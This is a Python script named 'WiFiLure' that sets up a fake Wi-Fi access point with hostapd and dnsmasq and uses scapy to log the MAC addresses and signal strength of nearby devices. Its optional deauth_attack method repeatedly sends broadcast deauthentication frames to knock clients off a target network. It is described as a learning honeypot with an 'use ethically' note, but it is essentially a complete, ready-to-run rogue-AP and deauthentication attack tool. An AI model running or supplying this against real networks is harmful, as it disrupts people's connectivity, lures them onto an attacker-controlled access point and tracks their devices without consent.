import argparse
import logging
import os
import subprocess
import sys
import time
from datetime import datetime
from scapy.all import *
from threading import Thread

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    handlers=[
        logging.FileHandler('wifilure.log'),
        logging.StreamHandler(sys.stdout)
    ]
)

class WiFiLure:
    def __init__(self, interface, ssid, channel=6, encryption=None, password=None, deauth=False, deauth_target=None, quiet=False):
        self.interface = interface
        self.ssid = ssid
        self.channel = channel
        self.encryption = encryption
        self.password = password
        self.deauth = deauth
        self.deauth_target = deauth_target
        self.quiet = quiet
        self.results = []
        self.output_file = f"wifilure_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        self.hostapd_conf = "/tmp/wifilure_hostapd.conf"
        self.hostapd_process = None
        self.dnsmasq_process = None

    def setup_interface(self):
        """Set up the Wi-Fi interface for AP mode."""
        try:
            # Stop NetworkManager to avoid interference
            subprocess.run(["sudo", "systemctl", "stop", "NetworkManager"], check=True)
            # Put interface in monitor mode temporarily to set channel
            subprocess.run(["sudo", "iwconfig", self.interface, "mode", "monitor"], check=True)
            subprocess.run(["sudo", "iwconfig", self.interface, "channel", str(self.channel)], check=True)
            # Switch to managed mode for hostapd
            subprocess.run(["sudo", "iwconfig", self.interface, "mode", "managed"], check=True)
            subprocess.run(["sudo", "ifconfig", self.interface, "up"], check=True)
            logging.info(f"Interface {self.interface} configured for channel {self.channel}")
        except subprocess.CalledProcessError as e:
            logging.error(f"Error setting up interface: {str(e)}")
            sys.exit(1)

    def create_hostapd_conf(self):
        """Create hostapd configuration file."""
        config = f"""
interface={self.interface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel={self.channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        if self.encryption == "wpa2" and self.password:
            config += f"""
wpa=2
wpa_passphrase={self.password}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
"""
        try:
            with open(self.hostapd_conf, 'w') as f:
                f.write(config.strip())
            logging.info(f"hostapd configuration created at {self.hostapd_conf}")
        except Exception as e:
            logging.error(f"Error creating hostapd config: {str(e)}")
            sys.exit(1)

    def start_hostapd(self):
        """Start hostapd to create the fake AP."""
        try:
            self.hostapd_process = subprocess.Popen(
                ["sudo", "hostapd", self.hostapd_conf],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            time.sleep(2)  # Wait for hostapd to start
            if self.hostapd_process.poll() is not None:
                logging.error("hostapd failed to start")
                sys.exit(1)
            logging.info(f"Started fake AP: SSID={self.ssid}, Channel={self.channel}")
        except Exception as e:
            logging.error(f"Error starting hostapd: {str(e)}")
            sys.exit(1)

    def start_dnsmasq(self):
        """Start dnsmasq for DHCP services."""
        try:
            # Configure IP address for the interface
            subprocess.run(["sudo", "ifconfig", self.interface, "192.168.99.1", "netmask", "255.255.255.0"], check=True)
            # Start dnsmasq
            self.dnsmasq_process = subprocess.Popen(
                ["sudo", "dnsmasq", "-i", self.interface, "--dhcp-range=192.168.99.2,192.168.99.254,12h"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            logging.info("Started dnsmasq for DHCP services")
        except Exception as e:
            logging.error(f"Error starting dnsmasq: {str(e)}")
            sys.exit(1)

    def process_packet(self, packet):
        """Process captured packets to log client connections."""
        if packet.haslayer(Dot11ProbeReq) or packet.haslayer(Dot11AssocReq):
            mac = packet.addr2
            ssid = packet.info.decode() if packet.info else "Unknown"
            signal = packet.dBm_AntSignal if hasattr(packet, 'dBm_AntSignal') else "N/A"
            if ssid == self.ssid or packet.haslayer(Dot11AssocReq):
                result = {
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'mac': mac,
                    'ssid': ssid,
                    'signal': signal,
                    'type': 'Probe' if packet.haslayer(Dot11ProbeReq) else 'Association'
                }
                self.results.append(result)
                if not self.quiet:
                    logging.info(f"{result['type']}: MAC={mac}, SSID={ssid}, Signal={signal}dBm")

    def start_sniffing(self):
        """Start sniffing for probe and association requests."""
        try:
            sniff(iface=self.interface, prn=self.process_packet, filter="type mgt subtype probe-req or subtype assoc-req", store=0)
        except Scapy_Exception as e:
            logging.error(f"Error sniffing packets: {str(e)}")

    def deauth_attack(self):
        """Perform a deauthentication attack on a target BSSID."""
        if not self.deauth_target:
            logging.error("Deauthentication target BSSID required")
            return
        try:
            # Craft deauth packet
            dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.deauth_target, addr3=self.deauth_target)
            deauth = Dot11Deauth(reason=7)
            packet = RadioTap()/dot11/deauth
            logging.info(f"Starting deauthentication attack on BSSID {self.deauth_target}")
            while self.deauth:
                sendp(packet, iface=self.interface, count=10, inter=0.1, verbose=False)
                time.sleep(1)
        except Exception as e:
            logging.error(f"Error in deauthentication attack: {str(e)}")

    def save_results(self):
        """Save logged connection attempts to a file."""
        try:
            with open(self.output_file, 'w') as f:
                for result in self.results:
                    f.write(f"[{result['timestamp']}] {result['type']}\n")
                    f.write(f"MAC: {result['mac']}\n")
                    f.write(f"SSID: {result['ssid']}\n")
                    f.write(f"Signal: {result['signal']}dBm\n")
                    f.write(f"{'-'*50}\n")
            logging.info(f"Results saved to {self.output_file}")
        except Exception as e:
            logging.error(f"Error saving results: {str(e)}")

    def cleanup(self):
        """Clean up processes and configurations."""
        try:
            if self.hostapd_process:
                subprocess.run(["sudo", "pkill", "hostapd"], check=False)
            if self.dnsmasq_process:
                subprocess.run(["sudo", "pkill", "dnsmasq"], check=False)
            subprocess.run(["sudo", "systemctl", "start", "NetworkManager"], check=False)
            if os.path.exists(self.hostapd_conf):
                os.remove(self.hostapd_conf)
            logging.info("Cleaned up processes and configurations")
        except Exception as e:
            logging.error(f"Error during cleanup: {str(e)}")

    def start(self):
        """Start the WiFi honeypot."""
        logging.info(f"Starting WiFiLure: SSID={self.ssid}, Interface={self.interface}, Channel={self.channel}")
        self.setup_interface()
        self.create_hostapd_conf()
        self.start_hostapd()
        self.start_dnsmasq()

        # Start sniffing in a separate thread
        sniff_thread = Thread(target=self.start_sniffing)
        sniff_thread.daemon = True
        sniff_thread.start()

        # Start deauthentication attack if enabled
        if self.deauth:
            deauth_thread = Thread(target=self.deauth_attack)
            deauth_thread.daemon = True
            deauth_thread.start()

        try:
            while True:
                time.sleep(1)  # Keep the main thread alive
        except KeyboardInterrupt:
            logging.info("WiFiLure stopped by user")
            self.save_results()
            self.cleanup()

def main():
    parser = argparse.ArgumentParser(description="WiFiLure - A tool to create a Wi-Fi honeypot for learning.")
    parser.add_argument('-i', '--interface', required=True, help='Wi-Fi interface (e.g., wlan0)')
    parser.add_argument('-s', '--ssid', required=True, help='SSID for the fake AP (e.g., Free_WiFi)')
    parser.add_argument('-c', '--channel', default=6, type=int, help='Channel for the AP (default: 6)')
    parser.add_argument('-e', '--encryption', choices=['wpa2'], help='Encryption type (wpa2)')
    parser.add_argument('-p', '--password', help='Password for WPA2 (required if encryption is wpa2)')
    parser.add_argument('-d', '--deauth', action='store_true', help='Enable deauthentication attack (use ethically)')
    parser.add_argument('-t', '--deauth-target', help='Target BSSID for deauthentication')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode (log to file only)')

    args = parser.parse_args()

    if args.encryption == 'wpa2' and not args.password:
        logging.error("Password required for WPA2 encryption")
        sys.exit(1)
    if args.deauth and not args.deauth_target:
        logging.error("Deauthentication target BSSID required")
        sys.exit(1)

    if args.quiet:
        logging.getLogger().handlers = [logging.FileHandler('wifilure.log')]

    lure = WiFiLure(
        interface=args.interface,
        ssid=args.ssid,
        channel=args.channel,
        encryption=args.encryption,
        password=args.password,
        deauth=args.deauth,
        deauth_target=args.deauth_target,
        quiet=args.quiet
    )

    try:
        lure.start()
    except KeyboardInterrupt:
        logging.info("WiFiLure stopped by user")
        lure.cleanup()

if __name__ == "__main__":
    main()